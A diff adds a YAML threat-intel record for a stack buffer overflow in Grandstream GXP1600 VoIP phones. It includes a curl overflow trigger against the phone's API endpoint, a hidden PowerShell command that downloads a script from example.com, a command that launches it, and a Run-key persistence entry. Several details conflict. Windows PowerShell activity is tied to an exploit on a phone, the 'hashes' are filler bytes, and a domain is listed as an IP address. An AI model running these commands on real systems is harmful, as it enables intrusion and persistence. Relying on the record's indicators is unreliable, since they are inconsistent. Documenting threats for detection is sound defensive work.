@@ -1,0 +1,49 @@
+description: Rapid7 Labs discovered a critical unauthenticated stack-based buffer
+  overflow vulnerability in the Grandstream GXP1600 series VoIP phones, allowing remote
+  attackers to achieve root privileges.
+TTPs:
+  processes:
+  - gs_web
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - curl -ik http://192.168.86.77/cgi-bin/api.values.get --data "request=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  - powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://example.com/script.ps1 -OutFile C:\\Users\\Public\\script.ps1"
+  - C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\script.ps1
+  powershell:
+  - Invoke-WebRequest -Uri http://example.com/script.ps1 -OutFile C:\\Users\\Public\\script.ps1
+  - Start-Process cmd.exe -ArgumentList "/c start C:\\Users\\Public\\script.ps1"
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousScript
+  image_load: []
+  network_connections:
+  - gs_web, 192.168.86.77, 80
+  - powershell.exe, example.com, 80
+  - cmd.exe, example.com, 80
+  file_activity:
+  - /tmp/core.gz
+  - /core
+  - C:\\Users\\Public\\script.ps1
+  persistence:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousScript
+  process_relations:
+  - powershell.exe->cmd.exe
+CVEs:
+- CVE-2026-2329
+IOCs:
+  hashes:
+  - '41414141414141414141414141414141'
+  - '81414141414141414141414141414141'
+  ip_addresses:
+  - 192.168.86.77
+  - example.com
+  domains:
+  - example.com
+  urls:
+  - http://example.com/script.ps1
+authors:
+- Stephen Fewer
+reference: https://www.rapid7.com/blog/post/ve-cve-2026-2329-critical-unauthenticated-stack-buffer-overflow-in-grandstream-gxp1600-voip-phones-fixed
+date_of_publication: February 18, 2026
+file_creation_date: February 21, 2026
